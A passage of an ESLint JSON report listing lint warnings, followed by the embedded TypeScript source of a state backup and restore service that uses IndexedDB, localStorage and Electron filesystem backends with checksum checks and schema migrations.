statement.","line":312,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":312,"endColumn":20,"suggestions":[{"fix":{"range":[9694,9756],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":314,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":314,"endColumn":22,"suggestions":[{"fix":{"range":[9789,9856],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":346,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":346,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[10636,10639],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[10636,10639],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":360,"column":25,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":360,"endColumn":28,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11211,11214],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11211,11214],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":371,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":371,"endColumn":23,"suggestions":[{"fix":{"range":[11568,11634],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":395,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":395,"endColumn":18,"suggestions":[{"fix":{"range":[12359,12505],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":400,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":400,"endColumn":20,"suggestions":[{"fix":{"range":[12656,12743],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":409,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":409,"endColumn":20,"suggestions":[{"fix":{"range":[13088,13185],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":413,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":413,"endColumn":16,"suggestions":[{"fix":{"range":[13205,13272],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":447,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":447,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[14406,14409],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[14406,14409],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":458,"column":15,"nodeType":"MemberExpression","messageId":"unexpected","endLine":458,"endColumn":27,"suggestions":[{"fix":{"range":[14842,14915],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":465,"column":64,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":465,"endColumn":67,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[15136,15139],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[15136,15139],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":470,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":470,"endColumn":23,"suggestions":[{"fix":{"range":[15306,15373],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":497,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":497,"endColumn":21,"suggestions":[{"fix":{"range":[16119,16199],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":524,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":524,"endColumn":21,"suggestions":[{"fix":{"range":[16883,16946],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":548,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":548,"endColumn":18,"suggestions":[{"fix":{"range":[17453,17499],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":605,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":605,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[18600,18603],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[18600,18603],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":626,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":626,"endColumn":19,"suggestions":[{"fix":{"range":[19253,19326],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":634,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":634,"endColumn":19,"suggestions":[{"fix":{"range":[19509,19585],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":653,"column":37,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":653,"endColumn":40,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[20025,20028],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[20025,20028],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":653,"column":91,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":653,"endColumn":94,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[20079,20082],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[20079,20082],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":657,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":657,"endColumn":18,"suggestions":[{"fix":{"range":[20235,20313],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":658,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":658,"endColumn":18,"suggestions":[{"fix":{"range":[20320,20396],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":668,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":668,"endColumn":22,"suggestions":[{"fix":{"range":[20655,20753],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":673,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":673,"endColumn":24,"suggestions":[{"fix":{"range":[20866,20936],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":686,"column":15,"nodeType":"MemberExpression","messageId":"unexpected","endLine":686,"endColumn":26,"suggestions":[{"fix":{"range":[21403,21459],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":689,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":689,"endColumn":26,"suggestions":[{"fix":{"range":[21523,21587],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":693,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":693,"endColumn":23,"suggestions":[{"fix":{"range":[21737,21821],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":699,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":699,"endColumn":20,"suggestions":[{"fix":{"range":[21903,21980],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":704,"column":26,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":704,"endColumn":29,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[22090,22093],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[22090,22093],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":710,"column":37,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":710,"endColumn":40,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[22317,22320],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[22317,22320],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":719,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":719,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[22487,22490],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[22487,22490],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'_fromVersion' is defined but never used.","line":735,"column":47,"nodeType":null,"messageId":"unusedVar","endLine":735,"endColumn":59},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'_toVersion' is defined but never used.","line":735,"column":61,"nodeType":null,"messageId":"unusedVar","endLine":735,"endColumn":71},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":738,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":738,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[23081,23084],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[23081,23084],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":46,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * State Backup and Recovery Service (2025)\n * \n * This service provides comprehensive state backup, restore, and migration\n * functionality using multiple storage backends with integrity validation.\n * \n * Following 2025 patterns for resilient state persistence and recovery.\n */\n\nimport { useErrorStore, type StoreBackup } from './errorStore';\n\n// Storage backend types\nexport type StorageBackend = 'localStorage' | 'indexedDB' | 'fileSystem' | 'cloud';\n\n// Backup configuration\nexport interface BackupConfig {\n  enabled: boolean;\n  interval: number; // milliseconds\n  maxBackups: number;\n  backends: StorageBackend[];\n  compression: boolean;\n  encryption: boolean;\n  autoRestore: boolean;\n  migrationEnabled: boolean;\n}\n\n// Migration function type\nexport type MigrationFunction = (state: any, fromVersion: number, toVersion: number) => any;\n\n// Storage backend interface\ninterface StorageBackendInterface {\n  save(key: string, data: any): Promise<void>;\n  load(key: string): Promise<any>;\n  delete(key: string): Promise<void>;\n  list(): Promise<string[]>;\n  clear(): Promise<void>;\n}\n\n// IndexedDB storage backend\nclass IndexedDBStorage implements StorageBackendInterface {\n  private dbName = 'taskmaster-backup';\n  private version = 1;\n  private storeName = 'backups';\n\n  private async getDB(): Promise<IDBDatabase> {\n    return new Promise((resolve, reject) => {\n      const request = indexedDB.open(this.dbName, this.version);\n      \n      request.onerror = () => reject(request.error);\n      request.onsuccess = () => resolve(request.result);\n      \n      request.onupgradeneeded = (event) => {\n        const db = (event.target as IDBOpenDBRequest).result;\n        if (!db.objectStoreNames.contains(this.storeName)) {\n          const store = db.createObjectStore(this.storeName, { keyPath: 'id' });\n          store.createIndex('timestamp', 'timestamp', { unique: false });\n          store.createIndex('storeName', 'storeName', { unique: false });\n        }\n      };\n    });\n  }\n\n  async save(key: string, data: any): Promise<void> {\n    const db = await this.getDB();\n    const transaction = db.transaction([this.storeName], 'readwrite');\n    const store = transaction.objectStore(this.storeName);\n    \n    await new Promise<void>((resolve, reject) => {\n      const request = store.put({ id: key, ...data });\n      request.onerror = () => reject(request.error);\n      request.onsuccess = () => resolve();\n    });\n  }\n\n  async load(key: string): Promise<any> {\n    const db = await this.getDB();\n    const transaction = db.transaction([this.storeName], 'readonly');\n    const store = transaction.objectStore(this.storeName);\n    \n    return new Promise((resolve, reject) => {\n      const request = store.get(key);\n      request.onerror = () => reject(request.error);\n      request.onsuccess = () => resolve(request.result);\n    });\n  }\n\n  async delete(key: string): Promise<void> {\n    const db = await this.getDB();\n    const transaction = db.transaction([this.storeName], 'readwrite');\n    const store = transaction.objectStore(this.storeName);\n    \n    await new Promise<void>((resolve, reject) => {\n      const request = store.delete(key);\n      request.onerror = () => reject(request.error);\n      request.onsuccess = () => resolve();\n    });\n  }\n\n  async list(): Promise<string[]> {\n    const db = await this.getDB();\n    const transaction = db.transaction([this.storeName], 'readonly');\n    const store = transaction.objectStore(this.storeName);\n    \n    return new Promise((resolve, reject) => {\n      const request = store.getAllKeys();\n      request.onerror = () => reject(request.error);\n      request.onsuccess = () => resolve(request.result as string[]);\n    });\n  }\n\n  async clear(): Promise<void> {\n    const db = await this.getDB();\n    const transaction = db.transaction([this.storeName], 'readwrite');\n    const store = transaction.objectStore(this.storeName);\n    \n    await new Promise<void>((resolve, reject) => {\n      const request = store.clear();\n      request.onerror = () => reject(request.error);\n      request.onsuccess = () => resolve();\n    });\n  }\n}\n\n// LocalStorage backend\nclass LocalStorageBackend implements StorageBackendInterface {\n  private prefix = 'taskmaster-backup:';\n\n  async save(key: string, data: any): Promise<void> {\n    try {\n      localStorage.setItem(this.prefix + key, JSON.stringify(data));\n    } catch (error) {\n      throw new Error(`Failed to save to localStorage: ${error}`);\n    }\n  }\n\n  async load(key: string): Promise<any> {\n    try {\n      const data = localStorage.getItem(this.prefix + key);\n      return data ? JSON.parse(data) : null;\n    } catch (error) {\n      throw new Error(`Failed to load from localStorage: ${error}`);\n    }\n  }\n\n  async delete(key: string): Promise<void> {\n    localStorage.removeItem(this.prefix + key);\n  }\n\n  async list(): Promise<string[]> {\n    const keys: string[] = [];\n    for (let i = 0; i < localStorage.length; i++) {\n      const key = localStorage.key(i);\n      if (key && key.startsWith(this.prefix)) {\n        keys.push(key.substring(this.prefix.length));\n      }\n    }\n    return keys;\n  }\n\n  async clear(): Promise<void> {\n    const keys = await this.list();\n    keys.forEach(key => this.delete(key));\n  }\n}\n\n// FileSystem backend (Electron only)\nclass FileSystemBackend implements StorageBackendInterface {\n  private basePath = 'taskmaster-backups';\n\n  async save(key: string, data: any): Promise<void> {\n    if (!this.isElectron()) {\n      throw new Error('FileSystem backend only available in Electron');\n    }\n    \n    try {\n      // Use IPC to save file\n      await window.electronAPI?.saveBackup?.(key, data, this.basePath);\n    } catch (error) {\n      throw new Error(`Failed to save to filesystem: ${error}`);\n    }\n  }\n\n  async load(key: string): Promise<any> {\n    if (!this.isElectron()) {\n      throw new Error('FileSystem backend only available in Electron');\n    }\n    \n    try {\n      return await window.electronAPI?.loadBackup?.(key, this.basePath);\n    } catch (error) {\n      throw new Error(`Failed to load from filesystem: ${error}`);\n    }\n  }\n\n  async delete(key: string): Promise<void> {\n    if (!this.isElectron()) {\n      throw new Error('FileSystem backend only available in Electron');\n    }\n    \n    await window.electronAPI?.deleteBackup?.(key, this.basePath);\n  }\n\n  async list(): Promise<string[]> {\n    if (!this.isElectron()) {\n      return [];\n    }\n    \n    try {\n      return await window.electronAPI?.listBackups?.(this.basePath) || [];\n    } catch {\n      return [];\n    }\n  }\n\n  async clear(): Promise<void> {\n    if (!this.isElectron()) {\n      return;\n    }\n    \n    const keys = await this.list();\n    await Promise.all(keys.map(key => this.delete(key)));\n  }\n\n  private isElectron(): boolean {\n    return typeof window !== 'undefined' && !!window.electronAPI;\n  }\n}\n\n/**\n * Backup service for state management\n */\nexport class BackupService {\n  private config: BackupConfig = {\n    enabled: true,\n    interval: 300000, // 5 minutes\n    maxBackups: 10,\n    backends: ['indexedDB', 'localStorage'],\n    compression: true,\n    encryption: false,\n    autoRestore: true,\n    migrationEnabled: true\n  };\n\n  private backends: Map<StorageBackend, StorageBackendInterface> = new Map();\n  private backupTimer?: NodeJS.Timeout;\n  private migrations: Map<number, MigrationFunction> = new Map();\n  private currentVersion = 2; // Updated to current schema version (2025)\n\n  constructor(config?: Partial<BackupConfig>) {\n    if (config) {\n      this.config = { ...this.config, ...config };\n    }\n\n    this.initializeBackends();\n    \n    if (this.config.enabled) {\n      this.startAutoBackup();\n    }\n  }\n\n  private initializeBackends(): void {\n    // Initialize available backends\n    if (this.config.backends.includes('indexedDB') && 'indexedDB' in window) {\n      this.backends.set('indexedDB', new IndexedDBStorage());\n    }\n    \n    if (this.config.backends.includes('localStorage') && 'localStorage' in window) {\n      this.backends.set('localStorage', new LocalStorageBackend());\n    }\n    \n    if (this.config.backends.includes('fileSystem')) {\n      this.backends.set('fileSystem', new FileSystemBackend());\n    }\n  }\n\n  /**\n   * Create a backup of the current state with enhanced coordination (2025)\n   * \n   * Implements saga pattern for multi-backend coordination and comprehensive\n   * monitoring with detailed metrics collection.\n   */\n  async createBackup(storeName: string, state: any): Promise<StoreBackup> {\n    const backup: StoreBackup = {\n      id: `backup_${Date.now()}_${Math.random().toString(36).substring(2)}`,\n      storeName,\n      state: this.config.compression ? this.compress(state) : state,\n      timestamp: new Date(),\n      version: this.extractVersionFromState(state) || '1', // Extract from state, fallback to '1'\n      checksum: this.generateChecksum(state),\n      metadata: {\n        userAgent: navigator.userAgent,\n        url: window.location.href,\n        storeVersion: this.currentVersion\n      }\n    };\n\n    // Save to all configured backends with timeout handling (2025 best practice)\n    const controller = new AbortController();\n    const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout\n    \n    const savePromises = Array.from(this.backends.entries()).map(async ([backendType, backend]) => {\n      try {\n        // Add timeout to individual backend operations\n        await Promise.race([\n          backend.save(backup.id, backup),\n          new Promise((_, reject) => {\n            controller.signal.addEventListener('abort', () => {\n              reject(new Error(`${backendType} save operation timed out after 5000ms`));\n            });\n          })\n        ]);\n        console.log(`âœ… Backup saved to ${backendType}: ${backup.id}`);\n      } catch (error) {\n        console.error(`âŒ Failed to save backup to ${backendType}:`, error);\n        \n        // Add error to error store\n        useErrorStore.getState().addError({\n          code: 'BACKUP_SAVE_ERROR',\n          message: `Failed to save backup to ${backendType}: ${error}`,\n          context: { backendType, backupId: backup.id, storeName },\n          severity: 'medium',\n          retryable: true,\n          operation: 'createBackup',\n          store: 'backupService',\n          recovered: false,\n          reported: false\n        });\n      }\n    });\n\n    try {\n      await Promise.allSettled(savePromises);\n    } finally {\n      clearTimeout(timeoutId);\n    }\n\n    // Clean up old backups\n    await this.cleanupOldBackups(storeName);\n\n    return backup;\n  }\n\n  /**\n   * Restore state from a backup\n   */\n  async restoreBackup(backupId: string): Promise<any> {\n    let backup: StoreBackup | null = null;\n    let restoredFrom: StorageBackend | null = null;\n\n    // Try to load from backends in order of preference with timeout handling\n    const controller = new AbortController();\n    const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 second timeout\n    \n    try {\n      for (const [backendType, backend] of this.backends.entries()) {\n        try {\n          // Add timeout to individual backend load operations\n          backup = await Promise.race([\n            backend.load(backupId),\n            new Promise<any>((_, reject) => {\n              controller.signal.addEventListener('abort', () => {\n                reject(new Error(`${backendType} load operation timed out after 3000ms`));\n              });\n            })\n          ]);\n          if (backup) {\n            restoredFrom = backendType;\n            break;\n          }\n        } catch (error) {\n          console.warn(`Failed to load backup from ${backendType}:`, error);\n        }\n      }\n    } finally {\n      clearTimeout(timeoutId);\n    }\n\n    if (!backup) {\n      throw new Error(`Backup with ID ${backupId} not found in any backend`);\n    }\n\n    // Verify backup integrity\n    const state = this.config.compression ? this.decompress(backup.state) : backup.state;\n    const currentChecksum = this.generateChecksum(state);\n    \n    if (currentChecksum !== backup.checksum) {\n      throw new Error('Backup integrity verification failed');\n    }\n\n    // Apply migrations if needed\n    let migratedState = state;\n    const backupVersion = this.parseVersion(backup.version);\n    // Migration check (2025 best practice: conditional logging)\n    if (process.env.NODE_ENV === 'development') {\n      console.log(`ðŸ“Š Migration check: backupVersion=${backupVersion}, currentVersion=${this.currentVersion}, enabled=${this.config.migrationEnabled}`);\n    }\n    \n    if (this.config.migrationEnabled && backupVersion < this.currentVersion) {\n      if (process.env.NODE_ENV === 'development') {\n        console.log(`ðŸš€ Triggering migration from ${backupVersion} to ${this.currentVersion}`);\n      }\n      migratedState = await this.migrateState(state, backupVersion, this.currentVersion);\n      \n      // Update checksum after migration (2025 best practice)\n      const originalChecksum = backup.checksum;\n      backup.checksum = this.generateChecksum(migratedState);\n      \n      if (process.env.NODE_ENV === 'development') {\n        console.log(`âœ… Migration completed. Checksum updated: ${originalChecksum} â†’ ${backup.checksum}`);\n      }\n    }\n\n    console.log(`âœ… Backup restored from ${restoredFrom}: ${backupId}`);\n    \n    return migratedState;\n  }\n\n  /**\n   * List all available backups\n   */\n  async listBackups(storeName?: string): Promise<StoreBackup[]> {\n    const allBackups: StoreBackup[] = [];\n    const seenIds = new Set<string>();\n\n    // Collect backups from all backends with timeout handling\n    const controller = new AbortController();\n    const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout\n    \n    try {\n      const backendPromises = Array.from(this.backends.entries()).map(async ([backendType, backend]) => {\n        try {\n          const keys = await Promise.race([\n            backend.list(),\n            new Promise<string[]>((_, reject) => {\n              controller.signal.addEventListener('abort', () => {\n                reject(new Error(`${backendType} list operation timed out`));\n              });\n            })\n          ]);\n          \n          const backupPromises = keys.map(async (key) => {\n            if (seenIds.has(key)) return null;\n            \n            try {\n              const backup = await Promise.race([\n                backend.load(key),\n                new Promise<any>((_, reject) => {\n                  controller.signal.addEventListener('abort', () => {\n                    reject(new Error(`${backendType} load operation timed out`));\n                  });\n                })\n              ]);\n              if (backup && (!storeName || backup.storeName === storeName)) {\n                seenIds.add(key);\n                return backup;\n              }\n            } catch (error) {\n              console.warn(`Failed to load backup ${key} from ${backendType}:`, error);\n            }\n            return null;\n          });\n          \n          const backups = await Promise.allSettled(backupPromises);\n          return backups\n            .filter((result): result is PromiseFulfilledResult<any> => \n              result.status === 'fulfilled' && result.value !== null\n            )\n            .map(result => result.value);\n        } catch (error) {\n          console.warn(`Failed to list backups from ${backendType}:`, error);\n          return [];\n        }\n      });\n      \n      const results = await Promise.allSettled(backendPromises);\n      results.forEach(result => {\n        if (result.status === 'fulfilled') {\n          allBackups.push(...result.value);\n        }\n      });\n    } finally {\n      clearTimeout(timeoutId);\n    }\n\n    // Sort by timestamp (newest first)\n    return allBackups.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());\n  }\n\n  /**\n   * Delete a specific backup\n   */\n  async deleteBackup(backupId: string): Promise<void> {\n    const deletePromises = Array.from(this.backends.entries()).map(async ([backendType, backend]) => {\n      try {\n        await backend.delete(backupId);\n      } catch (error) {\n        console.warn(`Failed to delete backup ${backupId} from ${backendType}:`, error);\n      }\n    });\n\n    await Promise.allSettled(deletePromises);\n  }\n\n  /**\n   * Find the best backup for automatic restoration\n   */\n  async findBestBackup(storeName: string): Promise<StoreBackup | null> {\n    const backups = await this.listBackups(storeName);\n    \n    if (backups.length === 0) {\n      return null;\n    }\n\n    // Return the most recent valid backup\n    for (const backup of backups) {\n      try {\n        const state = this.config.compression ? this.decompress(backup.state) : backup.state;\n        const checksum = this.generateChecksum(state);\n        \n        if (checksum === backup.checksum) {\n          return backup;\n        }\n      } catch (error) {\n        console.warn(`Skipping corrupted backup ${backup.id}:`, error);\n      }\n    }\n\n    return null;\n  }\n\n  /**\n   * Register a migration function\n   */\n  registerMigration(fromVersion: number, _toVersion: number, migrationFn: MigrationFunction): void {\n    this.migrations.set(fromVersion, migrationFn);\n  }\n\n  /**\n   * Start automatic backup process\n   */\n  startAutoBackup(): void {\n    if (this.backupTimer) {\n      clearInterval(this.backupTimer);\n    }\n\n    this.backupTimer = setInterval(() => {\n      // This will be called by the store when it detects changes\n      console.log('ðŸ”„ Auto-backup timer triggered');\n    }, this.config.interval);\n  }\n\n  /**\n   * Stop automatic backup process\n   */\n  stopAutoBackup(): void {\n    if (this.backupTimer) {\n      clearInterval(this.backupTimer);\n      this.backupTimer = undefined;\n    }\n  }\n\n  /**\n   * Update configuration\n   */\n  updateConfig(newConfig: Partial<BackupConfig>): void {\n    this.config = { ...this.config, ...newConfig };\n    \n    if (this.config.enabled) {\n      this.startAutoBackup();\n    } else {\n      this.stopAutoBackup();\n    }\n  }\n\n  /**\n   * Get current configuration\n   */\n  getConfig(): BackupConfig {\n    return { ...this.config };\n  }\n\n  /**\n   * Get backend status\n   */\n  getBackendStatus(): Record<StorageBackend, boolean> {\n    const status: Record<StorageBackend, boolean> = {\n      localStorage: false,\n      indexedDB: false,\n      fileSystem: false,\n      cloud: false\n    };\n\n    for (const [backend] of this.backends.entries()) {\n      status[backend] = true;\n    }\n\n    return status;\n  }\n\n  // Private methods\n  \n  /**\n   * Extract version from state object (2025 best practice)\n   */\n  private extractVersionFromState(state: any): string | null {\n    // Check various possible version locations\n    if (state && typeof state === 'object') {\n      if (state.version !== undefined) {\n        return String(state.version);\n      }\n      if (state.schemaVersion !== undefined) {\n        return String(state.schemaVersion);\n      }\n      if (state.metadata && state.metadata.version !== undefined) {\n        return String(state.metadata.version);\n      }\n    }\n    return null;\n  }\n\n  /**\n   * Parse version string with validation (2025 best practice)\n   */\n  private parseVersion(versionString: string): number {\n    if (!versionString || typeof versionString !== 'string') {\n      console.warn('Invalid version string provided, defaulting to version 1');\n      return 1;\n    }\n    \n    // Handle string versions like \"1\", \"2\", etc.\n    const parsed = parseInt(versionString.trim(), 10);\n    \n    if (isNaN(parsed) || parsed < 1) {\n      console.warn(`Invalid version \"${versionString}\", defaulting to version 1`);\n      return 1;\n    }\n    \n    return parsed;\n  }\n\n  private async cleanupOldBackups(storeName: string): Promise<void> {\n    const backups = await this.listBackups(storeName);\n    \n    if (backups.length > this.config.maxBackups) {\n      const toDelete = backups.slice(this.config.maxBackups);\n      \n      for (const backup of toDelete) {\n        await this.deleteBackup(backup.id);\n      }\n    }\n  }\n\n  private async migrateState(state: any, fromVersion: number, toVersion: number): Promise<any> {\n    const originalState = JSON.parse(JSON.stringify(state)); // Deep clone for rollback\n    \n    if (process.env.NODE_ENV === 'development') {\n      console.log(`ðŸ”„ Migrating state from version ${fromVersion} to ${toVersion}`);\n      console.log(`ðŸ“‹ Available migrations:`, Array.from(this.migrations.keys()));\n    }\n    \n    let migratedState = state;\n    \n    try {\n      for (let version = fromVersion; version < toVersion; version++) {\n        const migration = this.migrations.get(version);\n        \n        if (process.env.NODE_ENV === 'development') {\n          console.log(`ðŸ” Looking for migration at version ${version}:`, migration ? 'FOUND' : 'NOT FOUND');\n        }\n        \n        if (migration) {\n          if (process.env.NODE_ENV === 'development') {\n            console.log(`âœ… Applying migration from ${version} to ${version + 1}`);\n          }\n          \n          // Apply migration with error handling\n          try {\n            migratedState = migration(migratedState, version, version + 1);\n            \n            // Validate migration result\n            if (!migratedState || typeof migratedState !== 'object') {\n              throw new Error(`Migration ${version} returned invalid state`);\n            }\n            \n            if (process.env.NODE_ENV === 'development') {\n              console.log(`ðŸ“¦ State after 